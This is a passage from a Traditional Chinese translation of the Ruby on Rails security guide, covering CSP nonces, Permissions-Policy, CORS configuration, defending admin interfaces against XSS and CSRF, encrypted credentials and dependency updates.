Rails.application.config.content_security_policy do |policy|
  policy.report_uri "/csp-violation-report-endpoint"
end
```

在遷移遺留內容時，您可能希望報告違規行為而不強制執行策略。將[`Content-Security-Policy-Report-Only`][]響應標頭設置為僅報告違規行為：

```ruby
Rails.application.config.content_security_policy_report_only = true
```

或在控制器中覆蓋它：

```ruby
class PostsController < ApplicationController
  content_security_policy_report_only only: :index
end
```

#### 添加Nonce

如果您正在考慮使用`'unsafe-inline'`，請考慮改用nonce。[Nonce提供了顯著的改進](https://www.w3.org/TR/CSP3/#security-nonces)，在現有代碼的基礎上實施內容安全策略時，優於`'unsafe-inline'`。
```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.script_src :self, :https
end

Rails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }
```

在配置nonce生成器時需要考慮一些權衡。使用`SecureRandom.base64(16)`是一個很好的默認值，因為它會為每個請求生成一個新的隨機nonce。然而，這種方法與[條件GET緩存](caching_with_rails.html#conditional-get-support)不兼容，因為新的nonce會導致每個請求的ETag值都不同。替代每個請求的隨機nonce的方法是使用會話ID：

```ruby
Rails.application.config.content_security_policy_nonce_generator = -> request { request.session.id.to_s }
```

這種生成方法與ETag兼容，但其安全性取決於會話ID足夠隨機且不會在不安全的cookie中暴露。

默認情況下，如果定義了nonce生成器，nonce將應用於`script-src`和`style-src`。`config.content_security_policy_nonce_directives`可以用於更改使用nonce的指令：

```ruby
Rails.application.config.content_security_policy_nonce_directives = %w(script-src)
```

一旦在初始化程序中配置了nonce生成，可以通過在`html_options`中添加`nonce: true`來將自動nonce值添加到腳本標籤中：

```html+erb
<%= javascript_tag nonce: true do -%>
  alert('Hello, World!');
<% end -%>
```

對於`javascript_include_tag`也是一樣的：

```html+erb
<%= javascript_include_tag "script", nonce: true %>
```

使用[`csp_meta_tag`](https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag)輔助方法創建一個名為"csp-nonce"的元標籤，其中包含每個會話的nonce值，以允許內聯的`<script>`標籤。

```html+erb
<head>
  <%= csp_meta_tag %>
</head>
```

這在Rails UJS輔助方法中用於創建動態加載的內聯`<script>`元素。

### `Feature-Policy` 標頭

注意：`Feature-Policy` 標頭已更名為 `Permissions-Policy`。`Permissions-Policy` 需要不同的實現方式，並且尚未被所有瀏覽器支持。為了避免將來需要重新命名此中間件，我們使用新名稱來命名中間件，但目前仍保留舊的標頭名稱和實現方式。

要允許或阻止使用瀏覽器功能，您可以為應用程序定義一個 [`Feature-Policy`][] 響應標頭。Rails提供了一個DSL，允許您配置該標頭。

在適當的初始化程序中定義策略：

```ruby
# config/initializers/permissions_policy.rb
Rails.application.config.permissions_policy do |policy|
  policy.camera      :none
  policy.gyroscope   :none
  policy.microphone  :none
  policy.usb         :none
  policy.fullscreen  :self
  policy.payment     :self, "https://secure.example.com"
end
```

全局配置的策略可以在每個資源上進行覆蓋：

```ruby
class PagesController < ApplicationController
  permissions_policy do |policy|
    policy.geolocation "https://example.com"
  end
end
```


### 跨源資源共享

瀏覽器限制從腳本發起的跨源HTTP請求。如果您希望將Rails用作API，並在不同域上運行前端應用程序，則需要啟用[跨源資源共享](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)（CORS）。

您可以使用[Rack CORS](https://github.com/cyu/rack-cors)中間件來處理CORS。如果您使用`--api`選項生成了應用程序，則Rack CORS可能已經配置好，您可以跳過以下步驟。

首先，在Gemfile中添加rack-cors gem：

```ruby
gem 'rack-cors'
```

然後，添加一個初始化程序來配置中間件：

```ruby
# config/initializers/cors.rb
Rails.application.config.middleware.insert_before 0, "Rack::Cors" do
  allow do
    origins 'example.com'

    resource '*',
      headers: :any,
      methods: [:get, :post, :put, :patch, :delete, :options, :head]
  end
end
```

內部網和管理安全性
---------------------------

內部網和管理界面是受歡迎的攻擊目標，因為它們允許特權訪問。儘管這需要幾個額外的安全措施，但在現實世界中情況相反。

2007年，出現了第一個針對內部網的定制木馬，即Monster.com的"Monster for employers"網站，這是一個在線招聘網絡應用程序。定制木馬非常罕見，到目前為止風險相當低，但這確實是一種可能性，也是安全客戶端主機的重要性的一個例子。然而，內部網和管理應用程序面臨的最大威脅是XSS和CSRF。

### 跨站腳本

如果您的應用程序從外部網重新顯示惡意用戶輸入，則應用程序將容易受到XSS攻擊。用戶名、評論、垃圾郵件報告、訂單地址只是一些不常見的例子，其中可能存在XSS漏洞。

如果管理界面或內部網中有一個地方的輸入未經過濾，則整個應用程序都容易受到攻擊。可能的攻擊包括竊取特權管理員的cookie、注入iframe以竊取管理員的密碼或通過瀏覽器安全漏洞安裝惡意軟件以接管管理員的計算機。

有關XSS的對策，請參閱注入部分。

### 跨站請求偽造（CSRF）
跨站請求偽造（CSRF），也被稱為跨站引用偽造（XSRF），是一種巨大的攻擊方法，它允許攻擊者執行管理員或內部網使用者可能執行的所有操作。正如您在上面看到的CSRF的工作原理，以下是一些攻擊者可以在內部網或管理介面中執行的示例。

一個現實世界的例子是[通過CSRF重新配置路由器](http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html)。攻擊者向墨西哥用戶發送了一封帶有CSRF的惡意電子郵件。該電子郵件聲稱有一張電子卡等待用戶，但它還包含一個圖像標籤，導致對用戶的路由器進行HTTP-GET請求進行重新配置（這是墨西哥的一種常見型號）。該請求更改了DNS設置，以便將對墨西哥的銀行網站的請求映射到攻擊者的網站。通過該路由器訪問銀行網站的每個人都會看到攻擊者的假網站並且其憑證被竊取。

另一個例子是更改Google Adsense的電子郵件地址和密碼。如果受害者已經登錄到Google Adsense，即Google廣告活動的管理介面，攻擊者可以更改受害者的憑證。

另一種常見的攻擊是對您的Web應用程序，博客或論壇進行垃圾郵件攻擊，以傳播惡意的XSS。當然，攻擊者必須知道URL結構，但大多數Rails的URL都相當直觀，或者如果它是開源應用程序的管理介面，則很容易找到。攻擊者甚至可以通過包含惡意的IMG標籤（嘗試每種可能的組合）進行1000次幸運猜測。

有關管理介面和內部網應用程序中防範CSRF的對策，請參閱CSRF部分的對策。

### 額外預防措施

常見的管理介面工作方式如下：它位於www.example.com/admin，只有在User模型中設置了管理員標誌時才能訪問，重新顯示用戶輸入並允許管理員刪除/添加/編輯所需的任何數據。以下是一些關於此的想法：

* 非常重要的是要考慮到最壞的情況：如果有人真的獲得了您的cookie或用戶憑證，您可以引入管理介面的角色以限制攻擊者的可能性。或者，除了用於應用程序公共部分的憑證之外，還可以使用特殊的登錄憑證來訪問管理介面。或者使用一個非常嚴重操作的特殊密碼？

* 管理員真的需要從世界各地訪問介面嗎？考慮限制登錄到一組源IP地址。使用request.remote_ip來查找用戶的IP地址。這並不是絕對安全的，但是是一個很好的屏障。請記住，可能正在使用代理。

* 將管理介面放在一個特殊的子域名下，例如admin.application.com，並將其作為一個獨立的應用程序與自己的用戶管理。這樣做可以防止從通常的域名 www.application.com 竊取管理cookie。這是因為您的瀏覽器中的同源策略：在 www.application.com 上注入（XSS）腳本無法讀取admin.application.com的cookie，反之亦然。

環境安全
----------------------

本指南不涵蓋如何保護應用程序代碼和環境的範圍。但是，請確保您的數據庫配置（例如`config/database.yml`）、`credentials.yml`的主密鑰以及其他未加密的機密信息。您可能希望進一步限制訪問，使用特定於環境的這些文件的版本以及可能包含敏感信息的其他文件。

### 自定義憑證

Rails將機密信息存儲在`config/credentials.yml.enc`中，該文件已加密，因此無法直接編輯。Rails使用`config/master.key`或者查找環境變量`ENV["RAILS_MASTER_KEY"]`來加密憑證文件。由於憑證文件是加密的，只要主密鑰保持安全，它就可以存儲在版本控制中。

默認情況下，憑證文件包含應用程序的`secret_key_base`。它還可以用於存儲其他機密信息，例如外部API的訪問密鑰。

要編輯憑證文件，運行`bin/rails credentials:edit`命令。如果憑證文件不存在，此命令將創建該文件。此外，如果未定義主密鑰，此命令將創建`config/master.key`。

在憑證文件中保存的機密信息可以通過`Rails.application.credentials`訪問。
例如，使用以下解密的`config/credentials.yml.enc`：

```yaml
secret_key_base: 3b7cd72...
some_api_key: SOMEKEY
system:
  access_key_id: 1234AB
```

`Rails.application.credentials.some_api_key`返回`"SOMEKEY"`。`Rails.application.credentials.system.access_key_id`返回`"1234AB"`。
如果您希望在某個鍵為空時引發異常，可以使用驚嘆號版本：

```ruby
# 當 some_api_key 為空時...
Rails.application.credentials.some_api_key! # => KeyError: :some_api_key is blank
```

提示：使用 `bin/rails credentials:help` 了解有關憑據的更多信息。

警告：請保管好您的主密鑰，不要提交您的主密鑰。

依賴管理和 CVE
------------------

我們不會僅僅為了鼓勵使用新版本（包括安全問題）而升級依賴項。這是因為無論我們的努力如何，應用程序所有者都需要手動更新他們的 gem。使用 `bundle update --conservative gem_name` 安全地更新易受攻擊的依賴項。

其他資源
--------------------

安全環境不斷變化，保持最新是很重要的，因為錯過新的漏洞可能會造成災難。您可以在這裡找到有關（Rails）安全性的其他資源：

* 訂閱 Rails 安全性 [郵件列表](https://discuss.rubyonrails.org/c/security-announcements/9)。
* [Brakeman - Rails 安全性掃描器](https://brakemanscanner.org/) - 用於執行 Rails 應用程序的靜態安全性分析。
* [Mozilla 的 Web 安全指南](https://infosec.mozilla.org/guidelines/web_security.html) - 有關內容安全策略、HTTP 標頭、Cookies、TLS 配置等主題的建議。
* 一個 [優秀的安全性博客](https://owasp.org/)，包括 [跨站腳本攻擊防護小抄](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md)。
[`config.action_controller.default_protect_from_forgery`]: configuring.html#config-action-controller-default-protect-from-forgery
[`csrf_meta_tags`]: https://api.rubyonrails.org/classes/ActionView/Helpers/CsrfHelper.html#method-i-csrf_meta_tags
[`config.filter_parameters`]: configuring.html#config-filter-parameters
[`sanitize_sql`]: https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql
[`X-Frame-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
[`X-Content-Type-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
[`Referrer-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
[`Strict-Transport-Security`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
[`Content-Security-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
[`Content-Security-Policy-Report-Only`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only
[`report-uri`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri
[`Feature-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy
